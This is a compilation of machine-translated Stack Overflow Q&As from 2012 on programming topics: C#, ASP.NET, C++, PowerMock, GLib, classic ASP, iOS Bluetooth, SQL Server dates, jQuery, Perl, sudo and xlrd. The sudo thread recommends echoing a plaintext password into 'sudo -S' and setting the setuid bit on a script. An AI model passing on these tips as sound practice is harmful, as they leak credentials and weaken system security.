# c# - 循环遍历一组文件并检查它是否在 C# 中以逗号分隔

> ID：11955258
> 
> 赞同：-2
> 
> 时间：2012-08-14T15:03:38.273
> 
> 标签：c#, ssis

我需要遍历一组文件并检查它是否在 C# 中以逗号分隔。我对 C# 很陌生。请帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:15:21.947

这是一个快速的控制台应用程序，它将获取一个目录，扫描目录中的所有文件，然后遍历它们并返回包含逗号的行的百分比 -vs- 文件中的总行数。正如已经指出的那样，您可以验证一些 CSV 库。这只是一个让您入门的快速示例。

要使用它，请在 Visual Studio 中创建一个新的控制台应用程序项目并将其命名为“TestStub”，然后将其复制并粘贴到“Program.cs”文件中。

```
namespace TestStub
{
    using System;
    using System.IO;
    using System.Text;

    public class Program
    {
        private static char[] CSV = { ',', ',' };
        private static bool csvFound = false;
        /// <summary>
        /// This is the console program entry point
        /// </summary>
        /// <param name="args">A list of any command-line args passed to this application when started</param>
        public static void Main(string[] args)
        {
            // Change this to use args[0] if you like 
            string myInitialPath = @"C:\Temp";
            string[] myListOfFiles;

            try
            {
                myListOfFiles = EnumerateFiles(myInitialPath);

                foreach (string file in myListOfFiles)
                {
                    Console.WriteLine("\nFile {0} is comprised of {1}% CSV delimited lines.",
                        file, 
                        ScanForCSV(file));
                }

                Console.WriteLine("\n\nPress any key to exit.");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine(
                    "Error processing {0} for CSV content: {1} :: {2}", 
                    myInitialPath, 
                    ex.Message, 
                    ex.InnerException.Message);
            }
        }

        /// <summary>
        /// Get a list of all files for the specified path
        /// </summary>
        /// <param name="path">Directory path</param>
        /// <returns>String array of files (with full path)</returns>
        public static string[] EnumerateFiles(string path)
        {
            string[] arrItems = new string[1];

            try
            {
                arrItems = Directory.GetFiles(path);
                return arrItems;
            }
            catch (Exception ex)
            {
                throw new System.IO.IOException("EnumerateFilesAndFolders() encountered an error:", ex);
            }
        }
        /// <summary>
        /// Determines if the supplied file has comma separated values
        /// </summary>
        /// <param name="filename">Path and filename</param>
        /// <returns>Percentage of lines containing CSV elements -vs- those without</returns>
        public static float ScanForCSV(string filename)
        {
            //
            // NOTE: You should look into one of the many CSV libraries
            // available. This method will not carefully scruitinize
            // the file to see if there's a combination of delimeters or
            // even if it's a plain-text (e.g. a newspaper article)
            // It just looks for the presence of commas on multiple lines
            // and calculates a percentage of them with and without
            //
            float totalLines = 0;
            float linesCSV = 0;

            try
            {
                using (StreamReader sReader = new StreamReader(filename))
                {
                    int elements = 0;
                    string line = string.Empty;
                    string[] parsed = new string[1];

                    while (!sReader.EndOfStream)
                    {
                        ++totalLines;
                        line = sReader.ReadLine();
                        parsed = line.Split(CSV);
                        elements = parsed.Length;
                        if (elements > 1)
                        {
                            ++linesCSV;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new System.IO.IOException(string.Format("Problem accessing [{0}]: {1}", filename, ex.Message), ex);
            }
            return (float)((linesCSV / totalLines) * 100);
        }
    }  
} 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:13:58.177

正如有人已经指出的那样，这不会是一个简单的解决方案。如果每个逗号分隔的文件都有一个指定的扩展名（例如：csv），这*将非常容易。*如果不是，则以下算法应该起作用：

1.  检索指定目录中文件的所有名称（路径 + 名称）。如果需要，只过滤那些可能感兴趣的。提示：看看`System.IO.Directory`and `System.IO.File`and `System.IO.DirectoryInfo`and`System.IO.FileInfo`
2.  您必须检查每个文件，并检查它是否以逗号分隔。这将是棘手的部分。您可以构建一个正则表达式，它将检查文件的每一行并告诉您它是否以逗号分隔。

正则表达式在开始时有点难学，但它应该在一段时间后得到回报。

# asp.net - 将会话数据保存在 System.Web.Services.WebService 的 WebMethod 中

> ID：11955261
> 
> 赞同：0
> 
> 时间：2012-08-14T15:03:44.723
> 
> 标签：asp.net, web-services, session, webmethod

我正在使用 VS2010，asp.net c#。

我有一个这样声明的 WebMethod

```
 [WebMethod(EnableSession = true)]
        public String getErrorMsg()
        {           
if (HttpContext.Current.Session["error"] == null) return "empty";
else return ((String)(HttpContext.Current.Session["error"]));
        } 
```

在 System.Web.Services.WebService 类中（继承）。

在另一个 WebMethod 中，我设置了这个消息让我们假设它是这样的

```
 [WebMethod(EnableSession = true)]
            public void firstMethod()
            {           
    HttpContext.Current.Session["error"] ="bla";
} 
```

在另一个项目中，我向这个 WebService 添加了一个 Service Refrence。然后我尝试像这样使用它：

```
 WebService1.WebService1SoapClient MyService=
    new WebService1.WebService1SoapClient();
        MyService.firstMethod(); // this calls the method that sets
 //the "bla" string in the session
    String str=MyService.getErrorMsg();
    System.Diagnostics.Debug.WriteLine("Message "+str); 
```

STR 为“空”；

在第一种方法中，“bla”字符串设置为会话。只要我在这个方法中，我就可以使用会话存储的数据。当我再次调用 WebService 时，以前的会话数据不再存在。

我到处找。我发现只有这个例子：

```
 // instantiate the proxy 
    localhost.MyDemo MyService = new localhost.MyDemo();

    // create a container for the SessionID cookie
    MyService.CookieContainer = new CookieContainer();

    // call the Web Service function
    Label1.Text += MyService.HelloWorld() + "<br />"; 
```

但是有两个主要问题：

1）我的 WebService 不能用作对象，这意味着我不能在该类上使用“new”，就像这个例子一样。

我使用 WebService1SoapClient 来使用 WebService。

2）WebService1SoapClient对象中没有CookieContainer这个东西。

我认为这个例子一定是在旧的 vs/.net 版本中使用过的。

有谁知道如何在 webService 中保存 Session 数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T09:37:41.503

我似乎找到了答案。在 web.config 你有一个

```
 <system.serviceModel>
            <bindings>
              <basicHttpBinding>
 <binding name="NameOfWebServiceSoap"/>
         </basicHttpBinding>
            </bindings>
           <client>
              <endpoint address="*AddressOfWebService*" binding="basicHttpBinding" bindingConfiguration="*NameOfWebServiceSoap*" 
    contract="*NameOfWebService.NameOfWebServiceSoap*" name="*NameOfServiceReference*"/>
            </client>
          </system.serviceModel> 
```

在绑定名称下添加以下内容：

```
allowCookies="true" 
```

所以它看起来像这样：

```
<binding name="NameOfWebServiceSoap" allowCookies="true"/> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-14T15:39:56.023

我不得不认为你被误认为有两个原因

1.  您正在使用*新*的网络服务代理类

    > WebService1.WebService1SoapClient MyService= **new** WebService1.WebService1SoapClient();

2.  您使用 Visual Studio 创建的任何 Web 服务代理都继承自`System.Web.Services.Protocols.HttpWebClientProtocol`实现 CookieContainer()

# c++ - VS2010 只有静态 const 整数数据成员可以在类内初始化

> ID：11955262
> 
> 赞同：2
> 
> 时间：2012-08-14T15:03:50.223
> 
> 标签：c++, visual-studio-2010, compiler-errors

最近有人告诉我，Windows Visual Studio 是用于 C++ 开发的最佳 IDE 之一，所以我决定买它，但这是我第一次使用它，我已经遇到了一个奇怪的错误。以下代码：

```
#include "stdafx.h"
#include "iostream"
#include "string"
using namespace std;

class Player {
public:
    string name = "Player";
};

int main() {
    cout << "Works";
    return 0;
} 
```

返回错误 C2864: 'Player::name' : 只有静态 const 整数数据成员可以在类中初始化。怎么了？此代码在 Codeblocks IDE 中编译。请向我解释我不明白的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:06:43.523

```
class Player {
public:
    string name = "Player";
}; 
```

此语法已在 C++11 中引入。在以前版本的标准中，如 MSVC 支持的 C++03，应该如下所示：

```
class Player {
public:
    Player() : name("Player") {}
    string name;
}; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-14T15:04:58.517

在 C++03 中，不能在声明点初始化数据成员。您可以在构造函数中执行此操作。

```
class Player {
public:
    Player() : name("Player") {}
    string name;
}; 
```

在 C++11 中，您的代码很好，因此可能是您在 Codeblocks 中使用 C++11 支持进行编译。

# file - .pes 文件创建者

> ID：11955265
> 
> 赞同：0
> 
> 时间：2012-08-14T15:03:53.467
> 
> 标签：file, creation, file-conversion

我正在考虑创办自己的服装品牌。我有样品材料和徽标，但绣花商要求我提供 PES 文件供她与兄弟刺绣机一起使用。我已经考虑将我的 .jpg 或 .png 文件更改为 .pes 文件，但我没有运气。看起来它不仅仅是简单的转换。

我的问题是，如果我提供徽标，任何人都可以为我创建 .pes 文件吗？如果没有，有人能指出我如何自己创建它的正确方向吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T23:30:52.830

有很多程序可以进行这种转换，但通常需要一些知识，而且通常软件相当昂贵。这里有一些更实惠的产品。

[http://www.sandscomputing.com/id20.html](http://www.sandscomputing.com/id20.html) http://www.buzztools.com/buzz-2-Stitches.asp

您可能希望先将图像转换为更具刺绣风格的图像，您可以使用以下操作：

[http://www.drawstitch.com/index.php/Products/Embroidery_Effect/](http://www.drawstitch.com/index.php/Products/Embroidery_Effect/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-24T20:36:03.887

你试过[Embroidermodder](http://embroidermodder.sourceforge.net/)吗？它是用于编辑数字刺绣文件的著名开源解决方案。

奇怪的是，它的创建者 Josh Varga 回答了这个问题，却没有给你指点！

# java - 每次使用 PowerMock 进行测试后，模拟行为都会重置

> ID：11955270
> 
> 赞同：14
> 
> 时间：2012-08-14T15:04:14.550
> 
> 标签：java, unit-testing, mocking, powermock

我正在使用 PowerMock 编写单元测试，模拟一些实用程序类的行为。为测试类定义一次行为（通过 @BeforeClass 注释）会导致：

*   第一次测试调用以返回模拟值
*   第二次测试调用返回真实方法返回值

示例代码：

```
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.powermock.api.mockito.PowerMockito;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

@RunWith(PowerMockRunner.class)
@PrepareForTest( {A.class, B.class})
public class TestMockedMethods {

private static B b;

@BeforeClass
public static void setUp() {
    PowerMockito.mockStatic(A.class);
    PowerMockito.when(A.getVal()).thenReturn("X");

    b = PowerMockito.mock(B.class);
    PowerMockito.when(b.getVal()).thenReturn("Y");
}

@Test
public void test1() { // PASS
    Assert.assertEquals("X", A.getVal());
    Assert.assertEquals("Y", b.getVal());
}

@Test
public void test2() { // FAIL
    Assert.assertEquals("X", A.getVal()); // actual="A"
    Assert.assertEquals("Y", b.getVal()); // actual="B"
}

}
class A {
  static String getVal() {
    return "A";
  }
}
class B {
  String getVal() {
    return "B";
  }
} 
```

任何想法为什么第二次测试失败？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-14T15:28:49.667

该方法`PowerMockito.mockStatic(...)`调用`MockCreator.mock(...)`. 此方法注册一个 Runnable ，将**在每次测试后**执行：

```
MockRepository.addAfterMethodRunner(new MockitoStateCleaner()); 
```

这个 runnable 清除了**Mockito 的内部状态**：

```
private static class MockitoStateCleaner implements Runnable {
    public void run() {
        clearMockProgress();
        clearConfiguration();
    }

    private void clearMockProgress() {
        clearThreadLocalIn(ThreadSafeMockingProgress.class);
    }

    private void clearConfiguration() {
        clearThreadLocalIn(GlobalConfiguration.class);
    }

    private void clearThreadLocalIn(Class<?> cls) {
        Whitebox.getInternalState(cls, ThreadLocal.class).set(null);
        final Class<?> clazz = ClassLoaderUtil.loadClass(cls, ClassLoader.getSystemClassLoader());
        Whitebox.getInternalState(clazz, ThreadLocal.class).set(null);
    }
} 
```

所以你应该在每次测试之前执行你的设置。

```
@Before
public void setUp() {
    PowerMockito.mockStatic(A.class);
    PowerMockito.when(A.getVal()).thenReturn("X");

    b = PowerMockito.mock(B.class);
    PowerMockito.when(b.getVal()).thenReturn("Y");
} 
```

# gtk - GTK：取消超时

> ID：11955271
> 
> 赞同：18
> 
> 时间：2012-08-14T15:04:15.603
> 
> 标签：gtk, glib

GTK 允许您使用`g_timeout_add`. 就像`g_signal_connect`，该`g_timeout_add`函数返回一个表示超时的 id。那么，有没有办法使用 id*取消超时？*查看[文档](http://developer.gnome.org/glib/2.31/glib-The-Main-Event-Loop.html)，我看不到任何取消超时事件的方法，但我认为必须有某种方法，否则`id`返回的值有什么意义`g_timeout_add`？

那么，有什么方法可以取消超时事件，或者这只是需要通过设置一个可以在用户提供的超时处理函数中检查的“取消标志”来手动处理的事情？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-14T15:09:26.840

有两种方法可以删除通过[g_timeout_add()](https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-timeout-add)注册的回调：

*   有回调函数返回`FALSE`，
*   使用返回的标识符调用[g_source_remove()](https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-source-remove)`g_timeout_add()`。

# asp-classic - RecordSet，检查最后一条记录

> ID：11955274
> 
> 赞同：2
> 
> 时间：2012-08-14T15:04:19.483
> 
> 标签：asp-classic, recordset

我正在使用基于数据库中数据的谷歌图表框架......

我需要生成如下输出：

```
([
  ['Year',  'ON',   'OFF',  'X1',   'X2'],
  ['Jan/12',    2,  5,      10,         9],
  ['Fev/12',    5,  10,     54,         10],
  ['Mar/12',    10, 36,     15,         10]
]); 
```

请注意，最后一行没有逗号。我的代码如下所示：

```
([
  ['Year',  'ON',   'OF',   'X1',   'X1'],
    <%
        WHILE NOT DB.EOF
        ON= DB("ON")
        OFF= DB("OFF")
        X1= DB("X1")
        X2= DB("X2")
    %>
        ['<% Response.Write Month %>/<% Response.Write Year %>',    <% Response.Write ON %>, <% Response.Write OFF %>, <% Response.Write X1 %>, <% Response.Write X2 %>,
    <%
        DB.MOVENEXT
        WEND
    %>
]); 
```

我的问题：如何检查循环何时到达最后一行，而不是放逗号，什么都不放？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-15T10:46:35.653

AnthonyWJones 的回答对我来说似乎没问题，但你也可以在循环内询问是否在下一步移动后你不在 EOF 然后你写“，”

```
([ 
    ['Year',  'ON',   'OFF',   'X1',   'X2']
    <% Do While Not DB.EOF %>
        [
         '<%= Month %>/<%= Year %>', 
         <%= DB("ON") %>, 
         <%= DB("OFF") %>, 
         <%= DB("X1") %>, 
         <%= DB("X2") %>
        ]
        <%
        DB.MoveNext
        %>
        <% If Not DB.EOF Then %>
            ,
        <% End If %>
    <% Loop %>
]); 
```

;-)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T21:29:56.647

你得到 RecordCount = -1 因为一个只向前的记录集不知道有多少记录还没有到来。

这里采用的方法是在循环顶部插入一些内容。

```
([ 
  ['Year',  'ON',   'OFF',   'X1',   'X2']
    <% 
        Do While Not DB.EOF
            Response.Write ", " & vbCrLf

            Response.Write "  ['" & Month & "/" & Year & "', " & DB("ON") & ", " & DB("OFF") & ", " & DB("X1") & ", " & DB("X2") & "]"  

            DB.MoveNext 
        Loop 
    %> 
]); 
```

# ios - 从 iOS 连接到蓝牙设备，没有 MFi

> ID：11955278
> 
> 赞同：24
> 
> 时间：2012-08-14T15:04:27.810
> 
> 标签：ios, bluetooth

我从 Stackoverflow 和整个互联网获得的氛围是，除非我使用的是 LE 设备，否则我为 iOS 应用程序制作的任何蓝牙设备都必须经过 MFi 认证。

但是，在[MFi FAQ](http://mfi.apple.com/faqs)页面上，我发现了这一行：

> ...仅依赖标准技术（例如，低功耗蓝牙或标准蓝牙配置文件）的配件开发商不需要加入 MFi 计划。

我的设备将能够使用标准蓝牙配置[文件文件传输协议 (FTP)](http://en.wikipedia.org/wiki/Bluetooth_profile#File_Transfer_Profile_.28FTP.29)。

现在这对我来说听起来像是一些相互矛盾的建议，或者我可能只是没有正确理解。因此，在提供了上述证据后，我只想直接问：我是否可以编写和发布一个 iOS 应用程序，使用标准蓝牙配置文件 FTP 连接到专有蓝牙设备，而无需将我的设备认证为 MFi？如果是这样，我需要知道哪些细节、注意事项等？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-08-30T16:51:12.073

在 Apple 最新的 iOS 设备中实施的新蓝牙 4.0 低功耗（以下简称 BLE 4.0）规范确实允许创建应用程序特定配置文件并连接到 BLE 4.0 设备而无需越狱、使用批准的蓝牙 2.1 配置文件或成为 Apple 的一部分'd MFI 程序并使用以前需要的 MFI 加密芯片。

换句话说，使用适当的 BLE 4.0 兼容蓝牙无线电，您可以创建连接到 iOS 应用程序的无线设备，而无需 Apple 预先批准该设备。但是，您必须为设备编写自定义应用程序，Apple 仍然有权拒绝该应用程序（如果他们愿意）。所以他们仍然在很大程度上控制了这一点。这本质上是 Apple 对 Android ADK 的回应，同时并未完全放弃关闭他们不喜欢的应用程序和设备的能力。

您的应用程序必须为您的应用程序的蓝牙配置文件包含特定的 XML 架构，并使用 CoreBluetoothFramework API，因此在应用程序批准过程中，Apple 很明显您的应用程序连接到设备。如果您的应用在没有设备的情况下无法运行，那么如果您不是 MFI 计划的一部分，那么它可能会被拒绝，因为 Apple 无法在没有您的设备的情况下测试该应用。似乎成功通过此测试的应用程序将设备用作应用程序功能的附件，而不是要求。例如，锻炼应用程序可能会连接到[BLE 4.0 心率监测器](http://9to5mac.com/2011/12/19/first-bluetooth-4-0-heart-rate-monitor-app-approved-by-apple/)，但该应用程序并不依赖它。

一些应用程序似乎通过在没有设备时显示模拟或在线信息来代替设备信息来解决此问题。因此，应用程序可以在没有设备的情况下进行测试，并且在设备存在时可以正常工作。

您可以在网上找到一些成功的努力：

[http://blog.makezine.com/2012/03/19/bluetooth-4-0-from-arduino-to-iphone-no-jailbreak-no-mfi/](http://blog.makezine.com/2012/03/19/bluetooth-4-0-from-arduino-to-iphone-no-jailbreaking-no-mfi/)

特别是 BlueGiga 一直在推动他们的[设备专门用于此用途](http://www.bluegiga.com/files/bluegiga/Presentations/BT4_0_for_Apple.pdf)，因此其他地方可能有论坛和支持。

请记住，目前支持 BLE 4.0 的设备是有限的，目前仅包括

*   iPhone 4S 和更高版本的 iPhone
*   最近的 MacBook Air、Mac Mini
*   iPad（第 3 代及更新机型，以及 iPad mini）
*   Macbook Pro 视网膜

可能还有其他支持此标准的 Apple 设备，这是 Apple 在每个产品的技术规格页面上公开宣传的内容，因此很容易找到当前产品。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-14T16:40:24.560

该行指的是 ios 设备本机支持的标准配置文件，例如 HFP 或 A2DP。如果您构建了一个执行 HFP 的耳机设​​备，则 iphone 将能够连接到它并将您的呼叫路由到耳机，而耳机不属于 MFi 的一部分。

如果你想写一个用蓝牙做其他事情的应用程序，包括 FTP，你必须使用 MFi。

# android - 如何使用 3G/UMTS 从 Android 向 PC 发送数据

> ID：11955280
> 
> 赞同：1
> 
> 时间：2012-08-14T15:04:37.997
> 
> 标签：android, wifi, umts

我想通过 WiFi 路由器从我的移动 Android 设备向 PC 发送/接收数据（例如二进制或字符串）。

这与我通过 WiFi 使用 TCP 套接字连接发送数据的方式相同吗？

所以我从我的客户端（Android 设备）发送数据并在我定义的端口上监听我的服务器？

如果我已经对 WiFi TCP 套接字连接进行了编程，如果我禁用 WiFi，是否必须添加额外的程序代码才能使用 3G 或 UMTS 发送数据？

谢谢！

迈克尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T10:07:22.047

因此，似乎不需要额外的代码，因为套接字在 OSI 模型上的层比 Wifi 或 3G 更高。

# datetime - SQL 其中 datetime 列等于今天的日期？

> ID：11955281
> 
> 赞同：73
> 
> 时间：2012-08-14T15:04:43.090
> 
> 标签：datetime, sql-server-2000

如何从创建日期为今天日期的数据库中获取记录？

```
SELECT [Title], [Firstname], [Surname], [Company_name], [Interest] 
FROM [dbo].[EXTRANET_users] 
WHERE DATE(Submission_date) = DATE(NOW()) 
```

这在使用 sql server 2000 时不起作用，提交日期是日期时间字段

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2012-08-14T15:09:29.733

看起来您正在使用 SQL Server，在这种情况下`GETDATE()`或`current_timestamp`可能会对您有所帮助。但是您必须确保与系统日期进行比较的日期格式匹配（时区、粒度等）

例如

```
where convert(varchar(10), submission_date, 102) 
    = convert(varchar(10), getdate(), 102) 
```

* * *

## 回答 #2

> 赞同：62
> 
> 时间：2012-08-14T15:09:20.457

你能试试这个吗？

```
SELECT [Title], [Firstname], [Surname], [Company_name], [Interest] 
FROM [dbo].[EXTRANET_users] 
WHERE CAST(Submission_date AS DATE) = CAST(GETDATE() AS DATE) 
```

T-SQL 并没有像 C# 那样真正具有“隐含”转换 - 您需要显式使用`CAST`(或`CONVERT`)。

此外，使用`GETDATE()`或`CURRENT_TIMESTAMP`获取“现在”日期和时间。

**更新：**因为您使用的是 SQL Server **2000** - 到目前为止，这些方法都不起作用。试试这个：

```
SELECT [Title], [Firstname], [Surname], [Company_name], [Interest] 
FROM [dbo].[EXTRANET_users] 
WHERE DATEADD(dd, 0, DATEDIFF(dd, 0, submission_date)) = DATEADD(dd, 0, DATEDIFF(dd, 0, GETDATE())) 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-14T15:11:10.217

可能还有另一种方法，但这应该有效：

```
SELECT [Title], [Firstname], [Surname], [Company_name], [Interest] 
FROM [dbo].[EXTRANET] 
WHERE day(Submission_date)=day(now) and 
     month(Submission_date)=month(now)
     and year(Submission_date)=year(now) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-11-05T06:39:57.117

简单的出路是使用这样的条件（使用所需的日期> GETDATE()-1）

您的 sql 语句“特定日期”> GETDATE()-1

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2021-01-02T07:05:27.630

获取记录创建日期为今天日期的所有记录使用 WHERE 子句后的代码

```
WHERE  CAST(Submission_date AS DATE) = CAST( curdate() AS DATE) 
```

# javascript - 此 JavaScript 单独工作，但不能与其他 JavaScript 一起工作

> ID：11955284
> 
> 赞同：-4
> 
> 时间：2012-08-14T15:04:51.807
> 
> 标签：javascript, jquery

我从我的程序员（外包）那里得到了这段代码：

```
<script type="text/javascript">
  $(function(){
     $('#notif-icons > li > a, #top-menu > li > a').click(function() {
         var clicked = $(this).next('.popup-notif');
         $('.popup-notif').not(clicked).fadeOut('fast');
         clicked.slideToggle('fast');
     }).toggle(function(){
        $(document).click(function() {
            $('.popup-notif').fadeOut('fast');
        });
        $('.popup-notif').click(function(e) {
            e.stopPropagation();
        });
     }, function() {
     });
  });
</script> 
```

该代码在纯 HTML 中单独工作，但是当我放入我的代码时，它不再工作了，我认为该代码有问题。例如 ：

```
}, function() {
         });
      });
    </script> 
```

我不知道那个空函数（）是用来做什么的……你们能帮帮我吗？因为我不是 JavaScript 方面的专家……谢谢！

**更新：此代码用于显示通知。一旦单击“通知图标”，就会出现“.popup-notif”，反之亦然。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:32:58.640

当你说你“把它放在你的代码中”（为什么你不在那里使用'z'？！！）时，你的意思是，当你将它逐字复制到 .js 文件中时？如果是这样，您也不会将`<script>`元素复制到 .js 文件中吗？与 HTML 内联的 JavaScript 需要一个`<script>`元素，.js 文件中的 JavaScript 不需要`<script>`并且`</script>`在 .js 文件内部，仅在引用 .js 文件的 HTML 中

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:33:08.947

~~代码实际上并没有*那么*糟糕。~~在这种情况下，`toggle`用作事件，而不是效果（参见[http://api.jquery.com/toggle-event/](http://api.jquery.com/toggle-event/)）。传递给它的两个函数指定对`$('#notif-icons > li > a, #top-menu > li > a')`元素的偶数和奇数点击执行什么操作。

~~JavaScript 代码看起来会做它应该做的事情；~~检查您的 HTML 是否正确。确保`$('#notif-icons > li > a, #top-menu > li > a')`匹配正确的元素，并且`.popup-notif`在*每个* `'#notif-icons > li > a, #top-menu > li > a'`. 如果您不是每次都输入它，那么当您单击菜单项时，弹出窗口可能会神秘地消失（对此的修复留给读者作为练习）。

此外，请确保在加载相关 HTML*之后加载 JavaScript；*要么将其放在文件的底部，要么将其包装在`$(document).ready(function(){[code goes here]})`.

不幸的是，您的问题没有提供足够的细节，我无法提供更具体的答案；JavaScript 需要上下文（也就是给我们相关的 HTML）。

我不知道你个人的 JavaScript 技能水平如何；但一个快速提示：外包工作通常会导致工作，但不是很好的代码。牢牢掌握他们正在使用的任何技术是一个好主意，这样您就可以理解和使用他们所做的工作，而不是完全依赖它们。

# perl - perl 中的相对寻址，使用 open dir

> ID：11955296
> 
> 赞同：0
> 
> 时间：2012-08-14T15:05:42.040
> 
> 标签：perl, opendir, relative-addressing

我有以下代码用于列出目录中的所有文件，路径寻址有问题，我的目录是*** */tmp/* ***，基本上我想要**tmp**目录中目录中的文件。但我不允许使用 * ，你有什么想法吗？

```
my $directory="*/tmp/*/";
opendir(DIR, $directory) or die "couldn't open $directory: $!\n";
my @files = readdir DIR;
foreach $files (@files){
    #...
} ;

closedir DIR; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:22:55.427

opendir 不能使用通配符

对于您的任务存在有点难看，但可行的解决方案

```
my @files = grep {-f} <*/tmp/*>; # this is equivalent of ls */tmp/* 
# grep {-f} will stat on each entry and filter folders
# So @files would contain only file names with relative path
foreach my $file (@files) {
    # do with $file whatever you want
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:36:14.140

没有通配符和`*`通配符：

```
use 5.010;
use Path::Class::Rule qw();
for my $tmp_dir (Path::Class::Rule->new->dir->and(sub { return 'tmp' eq (shift->dir_list(1,1) // q{}) })->all) {
    say $_ for $tmp_dir->children;
} 
```

# linux - 使用 sudo 和密码作为参数

> ID：11955298
> 
> 赞同：93
> 
> 时间：2012-08-14T15:05:48.983
> 
> 标签：linux, bash, sudo

我想用我的密码作为参数运行 sudo，以便我可以将它用于脚本。我试过了

```
sudo -S mypassword execute_command 
```

但没有任何成功。有什么建议么？

* * *

## 回答 #1

> 赞同：208
> 
> 时间：2012-08-14T15:08:51.353

-S 开关使 sudo 从 STDIN 读取密码。这意味着你可以做

```
echo mypassword | sudo -S command 
```

将密码传递给 sudo

但是，出于安全原因，其他人的建议不涉及将密码作为命令的一部分传递，例如检查用户是否为 root，这可能是更好的主意

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2012-08-14T15:09:11.137

您可以`s`为您的脚本设置该位，以便它不需要`sudo`并以 root 身份运行（并且您不需要在脚本中编写您的 root 密码）：

```
sudo chmod +s myscript 
```

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2012-08-14T15:08:35.747

```
echo -e "YOURPASSWORD\n" | sudo -S yourcommand 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-08-14T15:10:37.353

一种选择是对 sudo 使用 -A 标志。这会运行一个程序来询问密码。而不是询问，您可以有一个只吐出密码的脚本，以便程序可以继续。

* * *

## 回答 #5

> 赞同：-4
> 
> 时间：2012-08-14T15:12:37.810

```
# Make sure only root can run our script
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi 
```

# python - 如何在 Python 中从流（不是磁盘支持的文件）中读取 Excel 文件？

> ID：11955300
> 
> 赞同：16
> 
> 时间：2012-08-14T15:05:53.757
> 
> 标签：python, html, forms, request, xlrd

XLRD 安装和测试：

```
>>> import xlrd
>>> workbook = xlrd.open_workbook('Sample.xls') 
```

当我通过下面的 html 表单读取文件时，我可以访问所有值。

```
 xls_file = request.params['xls_file']
  print xls_file.filename, xls_file.type 
```

我正在使用 Pylons 模块，请求来自：`from pylons import request, tmpl_context as c`

我的问题：

1.  是通过一个对象`xls_file`读取的吗？`requst.params`
2.  如何阅读`xls_file`并使其与 xlrd 一起使用？

**更新：**

已`xls_file`上传到 Web 服务器上，但 xlrd 库需要文件名而不是打开的文件对象，如何使上传的文件与 xlrd 一起使用？（感谢 Martijn Pieters，我无法清楚地提出问题。）

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2013-01-19T20:15:08.250

xlrd 确实支持在没有文件路径的情况下直接提供数据，只需使用`file_contents`参数：

```
xlrd.open_workbook(file_contents=fileobj.read()) 
```

从[文档](http://xlrd.readthedocs.io/en/latest/api.html#xlrd.open_workbook)中：

> **file_contents** – 一个字符串或一个`mmap.mmap`对象或一些其他行为相似的对象。如果`file_contents`提供，`filename`将不会被使用，除了（可能）在消息中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-02-12T16:14:41.860

我遇到的问题与问题并不完全相同，但我认为可能是相似的，我可以给出一些提示。

我正在使用 django rest 框架的请求而不是 pylons 请求。

如果我编写如下简单代码：

```
@api_view(['POST'])
@renderer_classes([JSONRenderer])
def upload_files(request):
    file_obj = request.FILES['file']
    from xlrd import open_workbook
    wb = open_workbook(file_contents=file_obj.read())
    result = {"code": "0", "message": "success", "data": {}}
    return Response(status=200, data=result) 
```

在这里，我们可以使用前面评论中提到的 open_workbook(file_contents=file_obj.read()) 来阅读。

但是，如果您按以下方式编写代码：

```
from rest_framework.views import APIView
from rest_framework.parsers import MultiPartParser
class FileUploadView(APIView):
    parser_classes = (MultiPartParser,)

    def put(self, request, filename, format=None):
        file_obj = request.FILES.get('file')
        from xlrd import open_workbook
        wb = open_workbook(file_contents=file_obj.read())
        # do some stuff with uploaded file
        return Response(status=204) 
```

您必须注意使用 MultiPartParser 而不是 FileUploadParser，使用 FileUploadParser 会引发一些 BOF 错误。

所以我想知道它也受到你如何编写 API 的影响。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-11-16T16:04:49.513

对我来说，这段代码有效。蟒蛇 3

```
xlrd.open_workbook(file_contents=fileobj.content) 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-08-14T16:04:08.030

你可以尝试类似...

```
import xlrd

def newopen(fileobject, modes):
    return fileobject

oldopen = __builtins__.open
__builtins__.open = newopen
InputWorkBook = xlrd.open_workbook(fileobject)
__builtins__.open = oldopen 
```

如果文件对象还不是文件句柄，则可能必须将文件对象包装在 StringIO 中。

